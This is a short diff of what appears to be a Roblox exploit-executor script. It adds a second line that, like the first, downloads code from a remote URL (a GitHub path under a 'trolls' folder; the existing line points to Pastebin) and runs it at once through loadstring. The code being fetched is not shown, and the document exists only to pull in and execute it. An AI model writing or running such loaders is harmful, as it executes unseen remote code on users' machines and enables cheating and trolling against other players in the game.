@@ -1,1 +1,2 @@
 loadstring(game:HttpGet("https://pastebin.com/raw/95E0WDdA"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/starl1ghtscripter/starlight-dti-gui/refs/heads/main/trolls/nked"))()
